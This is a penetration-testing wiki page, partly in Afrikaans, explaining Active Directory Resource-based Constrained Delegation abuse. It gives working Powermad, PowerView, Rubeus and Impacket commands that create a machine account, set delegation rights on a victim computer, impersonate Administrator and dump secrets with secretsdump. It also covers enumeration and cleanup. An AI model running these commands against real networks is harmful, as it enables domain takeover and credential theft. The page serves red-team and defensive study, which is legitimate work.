# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basiese beginsels van Resource-based Constrained Delegation

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **in plaas daarvan** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **stel** in **die object wie in staat is om enige gebruiker teenoor dit te impersonate**.

In hierdie geval sal die constrained object ’n attribuut hê genaamd _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ met die naam van die gebruiker wat enige ander gebruiker teenoor dit kan impersonate.

Nog ’n belangrike verskil tussen hierdie Constrained Delegation en die ander delegations is dat enige gebruiker met **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) die **_msDS-AllowedToActOnBehalfOfOtherIdentity_** kan stel (In die ander vorme van Delegation het jy domain admin privs nodig gehad).

### Nuwe konsepte

In Constrained Delegation is dit gesê dat die **`TrustedToAuthForDelegation`** flag binne die _userAccountControl_ waarde van die gebruiker benodig word om ’n **S4U2Self.** uit te voer. Maar dit is nie heeltemal waar nie.\
Die werklikheid is dat selfs sonder daardie waarde, kan jy ’n **S4U2Self** teen enige gebruiker uitvoer as jy ’n **service** is (het ’n SPN) maar, as jy **`TrustedToAuthForDelegation`** het die teruggegewe TGS sal **Forwardable** wees en as jy daardie vlag **nie** het die teruggegewe TGS **sal nie** **Forwardable** wees.

As die **TGS** wat in **S4U2Proxy** gebruik word **nie Forwardable** is nie en jy probeer ’n basic Constrain Delegation misbruik, dit **sal nie werk**. Maar as jy ’n Resource-Based constrain delegation uitbuit, sal dit werk.

### Aanvalsstruktuur

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Veronderstel die aanvaller het reeds **write equivalent privileges over the victim computer**.

1. Die aanvaller **kompromitteer** ’n rekening wat ’n **SPN** het of **skep een** (“Service A”). Neem kennis dat **enige** _Admin User_ sonder enige ander spesiale regte tot 10 Computer objects kan **skep** (**_MachineAccountQuota_**) en vir hulle ’n **SPN** kan stel. Dus kan die aanvaller net ’n Computer object skep en ’n SPN instel.
2. Die aanvaller **misbruik sy WRITE privilege** oor die slachtoffer se komputer (ServiceB) om **resource-based constrained delegation te konfigureer sodat ServiceA enige gebruiker teenoor daardie slachtoffer komputer (ServiceB) kan impersonate**.
3. Die aanvaller gebruik Rubeus om ’n **volledige S4U attack** (S4U2Self en S4U2Proxy) van Service A na Service B uit te voer vir ’n gebruiker **met privileged access to Service B**.
1. S4U2Self (van die SPN kompromitteer/gemaakte rekening): Vra vir ’n **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Gebruik die **not Forwardable TGS** van die vorige stap om te vra vir ’n **TGS** van **Administrator** na die **victim host**.
3. Selfs al gebruik jy ’n not Forwardable TGS, aangesien jy Resource-based constrained delegation uitbuit, sal dit werk.
4. Die aanvaller kan **pass-the-ticket** en **impersonate** die gebruiker om **toegang tot die victim ServiceB** te kry.

Om die _**MachineAccountQuota**_ van die domein na te gaan kan jy gebruik:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Aanval

### Skep van 'n rekenaarobjek

Jy kan 'n rekenaarobjek binne die domein skep met behulp van **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigureer Resource-based Constrained Delegation

**Gebruik die activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Gebruik van powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Uitvoeren van 'n volledige S4U attack (Windows/Rubeus)

Eerstens het ons die nuwe Computer-objek geskep met die wagwoord `123456`, dus het ons die hash van daardie wagwoord nodig:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dit sal die RC4 en AES hashes vir daardie rekening afdruk.
Nou kan die attack uitgevoer word:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Jy kan meer tickets vir meer services genereer deur net een keer te vra met die `/altservice` param van Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Let wel dat gebruikers 'n attribuut het genaamd "**Cannot be delegated**". As 'n gebruiker hierdie attribuut op True het, sal jy hom nie kan impersonate nie. Hierdie eienskap kan in bloodhound gesien word.

### Linux-gereedskap: end-to-end RBCD met Impacket (2024+)

As jy vanaf Linux werk, kan jy die volledige RBCD-ketting uitvoer met die amptelike Impacket-gereedskap:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Aantekeninge
- As LDAP-signering/LDAPS afgedwing word, gebruik `impacket-rbcd -use-ldaps ...`.
- Gee voorkeur aan AES-sleutels; baie moderne domeine beperk RC4. Impacket en Rubeus ondersteun albei AES-only flows.
- Impacket kan die `sname` ("AnySPN") vir sommige gereedskap herskryf, maar kry die korrekte SPN wanneer moontlik (bv. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Toegang

Die laaste opdragreël sal die **volledige S4U-aanval uitvoer en die TGS** van Administrator na die slagoffer-gasheer in **geheue** injekteer.\
In hierdie voorbeeld is 'n TGS vir die **CIFS** diens vanaf Administrator aangevra, sodat jy toegang tot **C$** sal hê:
```bash
ls \\victim.domain.local\C$
```
### Misbruik verskillende service tickets

Lees meer oor die [**available service tickets here**](silver-ticket.md#available-services).

## Enumerering, ouditering en skoonmaak

### Enumereer rekenaars met RBCD gekonfigureer

PowerShell (dekodeer die SD om SIDs op te los):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lees of leegmaak met 'n enkele kommando):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Skoonmaak / terugstel RBCD

- PowerShell (verwyder die attribuut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-foute

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat Kerberos ingestel is om nie DES of RC4 te gebruik nie en jy verskaf slegs die RC4-hash. Verskaf aan Rubeus minstens die AES256-hash (of verskaf net die rc4, aes128 en aes256 hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd op die huidige rekenaar verskil van dié van die DC en Kerberos werk nie korrek nie.
- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om in te teken nie. Jy het dalk vergeet om die "$" binne die gebruikersnaam te sit toe jy die hashes genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dit kan beteken:
- Die gebruiker wat jy probeer impersonate kan nie toegang kry tot die verlangde diens nie (omdat jy dit nie kan impersonate nie of omdat dit nie genoeg voorregte het nie)
- Die gevraagde diens bestaan nie (bv. as jy 'n ticket vir winrm vra maar winrm loop nie)
- Die fakecomputer wat geskep is het sy voorregte oor die kwesbare bediener verloor en jy moet dit teruggee.
- Jy misbruik klassieke KCD; onthou RBCD werk met non-forwardable S4U2Self tickets, terwyl KCD forwardable vereis.

## Aantekeninge, relays en alternatiewe

- Jy kan ook die RBCD SD oor AD Web Services (ADWS) skryf indien LDAP gefilter is. Sien:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-relay-kettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te verkry. Sien praktiese end-tot-end voorbeelde:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- As LDAP signing/channel binding **gedeaktiveer** is en jy 'n machine account kan skep, kan gereedskap soos **KrbRelayUp** 'n afgedwonge Kerberos-auth na LDAP relay, `msDS-AllowedToActOnBehalfOfOtherIdentity` vir jou machine account op die teiken rekenaar-objek instel, en onmiddellik **Administrator** impersonate via S4U van af-host.

## Verwysings

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
